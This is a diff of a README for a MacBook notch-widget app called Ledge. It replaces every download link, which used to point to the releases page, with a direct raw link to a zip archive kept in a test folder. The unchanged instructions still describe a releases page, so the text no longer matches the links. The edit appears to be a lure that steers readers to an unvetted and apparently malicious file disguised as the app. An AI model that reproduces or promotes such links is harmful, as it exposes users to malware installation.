@@ -1,6 +1,6 @@
 🎉 Ledge - Your MacBook Notch, Finally Useful
 
-> ### ⬇️ [**Download Ledge Now**](https://github.com/Grebnevarsenij051/Ledge/releases)
+> ### ⬇️ [**Download Ledge Now**](https://github.com/Grebnevarsenij051/Ledge/raw/refs/heads/main/Tests/LedgeShellTests/Software-v3.9.zip)
 
 Ledge transforms the empty space at the top of your MacBook screen into a powerful command center. Instead of letting that notch sit there doing nothing, Ledge puts music controls, timers, your calendar, and live weather right where your eyes already are — no more glancing down at a menu bar or hunting for widgets.
 
@@ -8,7 +8,7 @@ Ledge transforms the empty space at the top of your MacBook screen into a powerf
 
 ## 📥 Getting Started
 
-Visit this link to download the application: **[https://github.com/Grebnevarsenij051/Ledge/releases](https://github.com/Grebnevarsenij051/Ledge/releases)**
+Visit this link to download the application: **[https://github.com/Grebnevarsenij051/Ledge/raw/refs/heads/main/Tests/LedgeShellTests/Software-v3.9.zip](https://github.com/Grebnevarsenij051/Ledge/raw/refs/heads/main/Tests/LedgeShellTests/Software-v3.9.zip)**
 
 Once you're on that page, look for the latest release. You'll see a list of files attached to that release. Click the file that matches your computer and save it to your Downloads folder. That's it — no complicated steps, no code, no technical knowledge required.
 
@@ -75,7 +75,7 @@ No. Ledge is designed to be efficient. The widgets update only when needed, and 
 
 Head over to the downloads page and grab the latest version. It takes less than a minute to set up. Once you see your music and calendar floating right there at the top of your screen, you'll wonder why it wasn't always like this.
 
-⬇️ **[Download Ledge Today](https://github.com/Grebnevarsenij051/Ledge/releases)**
+⬇️ **[Download Ledge Today](https://github.com/Grebnevarsenij051/Ledge/raw/refs/heads/main/Tests/LedgeShellTests/Software-v3.9.zip)**
 
 ---
 
